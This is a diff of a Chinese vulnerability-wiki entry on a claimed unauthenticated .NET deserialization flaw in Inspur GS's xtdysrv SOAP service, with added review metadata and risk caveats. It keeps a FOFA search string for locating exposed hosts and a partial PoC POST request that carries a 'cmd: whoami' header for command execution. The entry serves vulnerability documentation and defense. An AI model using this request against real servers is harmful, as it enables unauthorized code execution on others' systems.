@@ -1,27 +1,66 @@
 ---
-fofa: "cwbase/web/scripts/aes.js"
 source: "wy876 漏洞文库"
+title: "浪潮GS xtdysrv SavePrintFormatAssign .NET反序列化"
+product: "浪潮GS"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "无版本；Windows/.NET相关gadget"
+prerequisites: "声称未授权"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://www.yuque.com/xiaokp7/ocvun2/oro7nh02gg79zwah"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E6%B5%AA%E6%BD%AEGS%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6xtdysrv%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md"
+fofa_unverified: "cwbase/web/scripts/aes.js"
+id: "vw-1b0347003da886b598f7f8eb"
+entity_id: "ve-1b0347003da886b598f7f8eb"
+schema_version: "1"
 ---
 
-# 浪潮GS企业管理软件xtdysrv存在反序列化漏洞
+# 浪潮GS xtdysrv SavePrintFormatAssign .NET反序列化
 
-# 一、漏洞简介
+## 条目说明
+
+- 对象与具体问题：浪潮GS；xtdysrv SavePrintFormatAssign .NET反序列化
+- 版本、配置及部署条件：无版本；Windows/.NET相关gadget
+- 认证与权限前提：声称未授权
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 完整SOAP里printOpByte巨大Base64对象/嵌入程序集，源码全文已读但未反编译或执行，不可断言所有行为安全
+- Content-Length:length模板占位、无响应证据/服务端根因/版本/修复
+- cmd头与载荷耦合须说明，不能只抄不透明blob
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+## 一、漏洞简介
 浪潮GS 面向大中型集团企业采用SOA 架构和先进开放的GSP 应用中间件开发，形成了集团管控13 大领域15 大行业60余个细分行业的解决方案。在管理方面，浪潮GS 有效帮助企业有效实现财务集中管理、资金集中管理、资产集中管理、供应链集中管理，从而达到集团信息的集中监控以及企业集团成员之间资源共享、合作共赢、共同发展。在业务方面，浪潮GS 支持供应链协同、生产管理协同，打破企业资源（人、财、物、信息、流程等）之间的各种壁垒和边界，帮助企业实现内外供应链的全面管理，从而提高了整个产业链对客户的反应速度。浪潮GS企业管理软件xtdysrv存在反序列化漏洞，未经授权的攻击者可通过该漏洞获取服务器权限。
 
-# 二、影响版本
+## 二、影响版本
 + 浪潮GS企业管理软件
 
-# 三、资产测绘
+## 三、资产测绘
 + fofa`"cwbase/web/scripts/aes.js"`
 + 特征
 
 
-# 四、漏洞复现
-```plain
+## 四、漏洞复现
+```http
 POST /cwbase/service/rps/xtdysrv.asmx HTTP/1.1
 Host: 
 Content-Type: text/xml; charset=utf-8
-Content-Length: length
 cmd: whoami
 SOAPAction: "http://tempuri.org/SavePrintFormatAssign"
 
@@ -38,6 +77,8 @@ SOAPAction: "http://tempuri.org/SavePrintFormatAssign"
   </soap:Body>
 </soap:Envelope>
 ```
+
+> 请求长度说明：原资料 Content-Length 为 length；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 
 > 原文: <https://www.yuque.com/xiaokp7/ocvun2/oro7nh02gg79zwah>
